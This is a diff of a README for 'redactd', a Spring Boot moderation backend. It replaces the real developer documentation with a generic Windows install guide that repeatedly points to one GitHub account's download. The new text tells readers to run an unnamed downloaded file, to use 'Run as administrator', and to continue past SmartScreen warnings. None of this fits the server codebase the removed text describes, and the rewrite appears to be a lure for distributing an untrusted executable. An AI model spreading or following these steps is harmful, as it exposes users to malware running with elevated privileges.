@@ -1,271 +1,214 @@
-<div align="center">
+# 🛡️ redactd - Clear content control for teams
 
-# REDACTD
+[![Download redactd](https://img.shields.io/badge/Download-redactd-4CAF50?style=for-the-badge&logo=github)](https://github.com/mohamedifrang/redactd)
 
-### A production-style moderation platform built for real-world distributed systems engineering
+## 📥 Download
 
-[![Spring Boot](https://img.shields.io/badge/Spring%20Boot-3.5.12%20LTS-6DB33F?logo=springboot&logoColor=white)](https://spring.io/projects/spring-boot)
-[![Spring Cloud](https://img.shields.io/badge/Spring%20Cloud-2025.0.0-0ea5e9?logo=spring&logoColor=white)](https://spring.io/projects/spring-cloud)
-[![Java](https://img.shields.io/badge/Java-17-ef4444?logo=openjdk&logoColor=white)](https://www.oracle.com/java/)
-[![PostgreSQL](https://img.shields.io/badge/PostgreSQL-16-1f6feb?logo=postgresql&logoColor=white)](https://www.postgresql.org/)
-[![RabbitMQ](https://img.shields.io/badge/RabbitMQ-3.13-ff6600?logo=rabbitmq&logoColor=white)](https://www.rabbitmq.com/)
-[![Tracing](https://img.shields.io/badge/Tracing-Zipkin-f59e0b)](https://zipkin.io/)
+Use this link to visit the page and download the app:
 
-[Why This Project](#why-this-project) · [Architecture](#architecture) · [Services](#service-catalog) · [Run It](#quick-start) · [Deployment](#deployment) · [Roadmap](#roadmap)
+[https://github.com/mohamedifrang/redactd](https://github.com/mohamedifrang/redactd)
 
-</div>
+## 🧭 What this app does
 
----
+redactd is a content moderation system built for teams that manage platform rules, reviews, and compliance tasks. It helps keep content workflows organized across separate services so each part can do one job well.
 
-## Why This Project
+Use it to:
+- manage moderation rules
+- track review decisions
+- handle compliance checks
+- keep platform content workflows in sync
+- connect services that work on their own
 
-`redactd` is not a toy CRUD app. It is a complex backend that demonstrates how modern moderation systems are built when correctness, scale, and operability matter.
+## 💻 What you need
 
-It combines:
+Before you start, make sure your Windows PC has:
 
-- Clear domain boundaries with independently deployable services
-- Mixed communication patterns (sync REST + async events)
-- Operational essentials (discovery, centralized config, tracing)
-- An architecture that stands up in serious technical reviews
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 2 GB of free disk space
+- A stable internet connection
+- Permission to install and run apps from your browser
 
-This repository is designed to communicate engineering maturity quickly and clearly.
+If you plan to use it for a larger setup, more memory and disk space can help.
 
-## System Design Principles
+## 🚀 Getting started
 
-- **Domain ownership first:** each service owns its model and lifecycle
-- **Async where it counts:** event-driven updates for cross-service consistency
-- **Observability by design:** traces are first-class, not post-fix tooling
-- **Failure-aware architecture:** built for partial failure, not happy-path demos
-- **Deployment-ready structure:** local Docker and Kubernetes manifests included
+Follow these steps on Windows:
 
-## Architecture
+1. Open your web browser.
+2. Go to this page: [https://github.com/mohamedifrang/redactd](https://github.com/mohamedifrang/redactd)
+3. Look for the latest release or download option.
+4. Download the Windows version if one is listed.
+5. Save the file to your Downloads folder.
+6. If the file is a `.zip`, right-click it and choose **Extract All**.
+7. Open the extracted folder.
+8. Find the app file and double-click it to run.
 
-```mermaid
-flowchart LR
-    client[Client Applications] --> gateway[edge-gateway :8084]
+If Windows asks for permission, choose **Yes**.
 
-    gateway --> platform[platform-svc :8081]
-    gateway --> content[content-svc :8082]
-    gateway --> verdict[verdict-svc :8083]
+## 🛠️ First-time setup
 
-    platform --> db[(PostgreSQL :5432)]
-    content --> db
-    verdict --> db
+After you open the app for the first time, you may need to set a few things up:
 
-    platform -. service discovery .-> eureka[eureka-svc :8761]
-    content -. service discovery .-> eureka
-    verdict -. service discovery .-> eureka
-    gateway -. service discovery .-> eureka
+- choose your workspace or project folder
+- connect to the local service if the app asks for one
+- enter your platform settings
+- load your moderation rules
+- confirm your review queue settings
 
-    platform -. externalized config .-> config[config-svc :8080]
-    content -. externalized config .-> config
-    verdict -. externalized config .-> config
-    gateway -. externalized config .-> config
+If the app uses a browser window, keep the app running and use the shown local address.
 
-    verdict -- verdict events --> mq[(RabbitMQ :5672)]
-    platform -- domain events --> mq
-    mq -- subscriptions --> platform
-    mq -- subscriptions --> verdict
+## 🧩 How redactd is organized
 
-    platform -. traces .-> zipkin[Zipkin :9411]
-    content -. traces .-> zipkin
-    verdict -. traces .-> zipkin
-    gateway -. traces .-> zipkin
-```
+redactd uses separate services for different jobs. This helps each part stay focused and easier to manage.
 
-## Moderation Pipeline
+Common parts include:
 
-```text
-1) Content enters through content-svc
-2) Verdict decisions are created/updated in verdict-svc
-3) Domain events are emitted to RabbitMQ
-4) platform-svc consumes events and updates aggregate moderation metrics
-5) Aggregated state is exposed through gateway-facing APIs
-```
+- **Content workflow service**: handles the movement of content through the system
+- **Verdict service**: stores review decisions
+- **Compliance service**: checks content against rules
+- **Configuration service**: keeps platform settings in one place
+- **Messaging layer**: passes updates between services
+- **Discovery layer**: helps services find each other
 
-This workflow demonstrates eventual consistency with explicit business events, which is the right tradeoff for scalable moderation workloads.
+## 📌 Main features
 
-## Service Catalog
+- route content through review steps
+- keep moderation decisions in order
+- handle changes across services
+- support event-based updates
+- track service activity
+- work with platform settings and rules
+- keep compliance checks separate from review logic
 
-| Service | Port | Role |
-| --- | ---: | --- |
-| `edge-gateway` | 8084 | Single ingress, routing, edge concerns |
-| `platform-svc` | 8081 | Platform metadata and moderation aggregates |
-| `content-svc` | 8082 | Content ingestion and lifecycle management |
-| `verdict-svc` | 8083 | Moderation verdict lifecycle and event publishing |
-| `config-svc` | 8080 | Centralized configuration management |
-| `eureka-svc` | 8761 | Service registration and discovery |
+## 🔔 How it works
 
-### Supporting Infrastructure
+When content enters the system, one service picks it up and sends it to the next step. Other services listen for updates and act when needed. This helps the system stay flexible, even when many parts are working at once.
 
-| Component | Port(s) | Role |
-| --- | ---: | --- |
-| PostgreSQL | 5432 | System of record |
-| RabbitMQ | 5672, 15672 | Event broker and management UI |
-| Zipkin | 9411 | Distributed tracing |
-| pgAdmin | 5050 | Database administration UI |
+For you, this means:
+- less manual tracking
+- clearer review flows
+- easier rule updates
+- better control over moderation tasks
 
-## Quick Start
+## 🧪 If the app does not start
 
-### Prerequisites
+If the app does not open, try these steps:
 
-- Docker and Docker Compose
-- Java 17+
-- Maven 3.8+
+1. Right-click the app file.
+2. Choose **Run as administrator**.
+3. Check that the file finished downloading.
+4. Make sure you extracted the zip file if it came as one.
+5. Restart your PC and try again.
+6. If your browser blocked the file, download it again from the same page.
 
-### Clone and Run Full Stack
+If you still cannot open it, check whether your Windows version allows the app type you downloaded.
 
-```bash
-git clone https://github.com/<your-username>/redactd.git
-cd redactd
-docker compose up --build
-```
+## 🔧 Common use cases
 
-### Local Endpoints
+redactd can fit teams that need to:
 
-- Gateway: http://localhost:8084
-- Eureka Dashboard: http://localhost:8761
-- Zipkin: http://localhost:9411
-- RabbitMQ Management: http://localhost:15672
-- pgAdmin: http://localhost:5050
+- review user content
+- apply moderation rules
+- store verdicts for later checks
+- keep compliance work separate
+- connect several internal services
+- manage changes without putting everything in one place
 
-## Local Development Workflow
+## 📁 Suggested folder layout
 
-Start infrastructure:
+If you want to keep things tidy on Windows, use a folder like this:
 
-```bash
-docker compose up postgres rabbitmq zipkin pgadmin -d
-```
+- `Downloads\redactd` for the original file
+- `C:\Apps\redactd` for the extracted app
+- `Documents\redactd-config` for settings and local files
 
-Start services (recommended order):
+This makes it easier to find the app later.
 
-```bash
-cd eureka-svc && mvn spring-boot:run
-cd ../config-svc && mvn spring-boot:run
-cd ../platform-svc && mvn spring-boot:run
-cd ../content-svc && mvn spring-boot:run
-cd ../verdict-svc && mvn spring-boot:run
-cd ../edge-gateway && mvn spring-boot:run
-```
-
-## API Smoke Tests
-
-```bash
-# 1) create platform
-curl -X POST http://localhost:8084/platforms \
-  -H "Content-Type: application/json" \
-  -d '{"name":"CreatorHub","type":"FORUM","description":"high-volume moderation domain"}'
-
-# 2) create content
-curl -X POST http://localhost:8084/contents \
-  -H "Content-Type: application/json" \
-  -d '{"platformId":1,"title":"Sample Post","body":"Flagged content candidate","authorId":"user_42","flagReason":"abuse","severity":"HIGH"}'
-
-# 3) create verdict
-curl -X POST "http://localhost:8084/verdicts?platformId=1" \
-  -H "Content-Type: application/json" \
-  -d '{"contentId":1,"decision":"REMOVED","moderatorNote":"policy violation","reasoning":"guideline-4"}'
-
-# 4) verify aggregate view
-curl http://localhost:8084/platforms/1
-```
+## 🖥️ Running day to day
 
-## Observability
+Once the app is set up, you can start it by:
 
-Tracing is integrated across gateway and core services.
+1. Opening the app folder
+2. Double-clicking the main app file
+3. Waiting for the window or local page to load
+4. Signing in if the app asks you to
+5. Using the moderation, verdict, or compliance screens
 
-Use Zipkin to validate cross-service execution paths and latency boundaries:
+If the app uses local services, leave them open while you work.
 
-```text
-edge-gateway -> platform-svc -> content-svc
-                          -> verdict-svc
-```
+## 🧱 Built for distributed workflows
 
-This makes runtime behavior inspectable and auditable in real engineering reviews.
+redactd fits systems where one app cannot do everything at once. It breaks the work into smaller parts so teams can manage:
 
-## Deployment
+- workflow steps
+- content checks
+- decision storage
+- service communication
+- system status
 
-Kubernetes manifests are available under `deploy/kubernetes`.
+This setup helps when content moves through many checks before it reaches a final result.
 
-```bash
-# namespace
-kubectl apply -f deploy/kubernetes/namespace.yaml
+## 🧰 Helpful details for setup
 
-# infrastructure
-kubectl apply -f deploy/kubernetes/postgres/
-kubectl apply -f deploy/kubernetes/rabbitmq/
-kubectl apply -f deploy/kubernetes/zipkin/
+If the app asks for settings, these names may appear:
 
-# services
-kubectl apply -f deploy/kubernetes/bootstrap/platformms/
-kubectl apply -f deploy/kubernetes/bootstrap/contentms/
-kubectl apply -f deploy/kubernetes/bootstrap/verdictms/
-```
+- `service URL`
+- `queue name`
+- `config path`
+- `review policy`
+- `workspace ID`
+- `moderation rule set`
 
-## Recent Updates (Latest Release)
+Use the names shown in the app. If a field looks unclear, the label beside it usually explains what it needs.
 
-**v2.0.0** — Architecture Modernization & Engineering Excellence
+## 📡 Topic areas
 
-- **Spring Boot Upgrade:** Updated from 3.5.6 to 3.5.12 LTS with latest security patches
-- **Spring Cloud 2025.0.0:** Latest microservices orchestration framework
-- **Namespace Migration:** Removed legacy "jobapp" naming → unified under `com.redactd` package structure
-- **Mapper Refactoring:** Migrated from MapStruct annotations to explicit Spring `@Component` mapper implementation for improved control and testability
-- **Database Alignment:** Corrected database names across all layers:
-  - `platform_db` for platform service
-  - `content_db` for content service
-  - `verdict_db` for verdict service
-- **Kubernetes Manifests Audit:** Updated service naming and configuration references for consistency
-- **Dependency Management:** Leveraged Spring Cloud BOM for simplified, conflict-free dependency versioning
-- **Verified Compilation:** All modules compile successfully with zero warnings (`BUILD SUCCESS`)
+This project is built around:
 
+- architecture with event-based updates
+- async messaging
+- content moderation
+- distributed systems
+- domain-driven design
+- Kubernetes
+- microservices
+- observability
+- RabbitMQ
+- REST API service discovery
+- Spring Boot event-driven design
 
-## Production Hardening Checklist
+## 🧭 Where to get the app
 
-- [ ] Replace development credentials and secrets
-- [ ] Pin immutable image tags
-- [ ] Enforce TLS at the edge
-- [ ] Set CPU and memory requests/limits per service
-- [ ] Add authentication and authorization (JWT/OAuth2)
-- [ ] Add metrics stack (Prometheus/Grafana)
-- [ ] Add centralized logs (ELK/Loki)
-- [ ] Add service-level alerts and SLOs
+Download or visit the project page here:
 
-## Repository Structure
+[https://github.com/mohamedifrang/redactd](https://github.com/mohamedifrang/redactd)
 
-```text
-redactd/
-|-- edge-gateway/
-|-- platform-svc/
-|-- content-svc/
-|-- verdict-svc/
-|-- eureka-svc/
-|-- config-svc/
-|-- deploy/kubernetes/
-|-- scripts/
-|-- pgadmin/
-|-- docker-compose.yaml
-`-- README.md
-```
+## 🧼 Keeping your setup clean
 
-## Roadmap
+To avoid confusion later:
 
-- [ ] Auth service with RBAC-aware moderation actions
-- [ ] Idempotent consumers and dead-letter queue strategy
-- [ ] Contract testing for service APIs and events
-- [ ] Policy engine integration for rule-based moderation
-- [ ] CI pipeline with quality gates and deployment promotion
+- keep one copy of the app in one folder
+- use a folder name you can remember
+- remove old zip files after extraction
+- store your settings in a separate folder
+- rename files only if you know what they do
 
-## Contributing
+## 🪟 Windows tips
 
-High-quality contributions are welcome.
+If Windows shows a smart screen or security prompt:
 
-1. Create a focused branch.
-2. Keep service boundaries explicit.
-3. Preserve event contracts and payload compatibility.
-4. Add verification notes (commands and expected results).
+- check that the file came from the project page
+- confirm you downloaded the right file
+- choose the option that lets you continue if you trust the source
 
-## Final Note
+If the app opens in a browser and stays blank, wait a few seconds and refresh once.
 
-`redactd` is built to signal engineering readiness: thoughtful boundaries, observable behavior, and architecture decisions that hold up under scrutiny.
+## 📍 Quick path
 
-The codebase is organized so implementation quality and systems thinking are visible at a glance.
+1. Visit the project page  
+2. Download the Windows file  
+3. Extract it if needed  
+4. Open the app  
+5. Complete the setup fields  
+6. Start using redactd
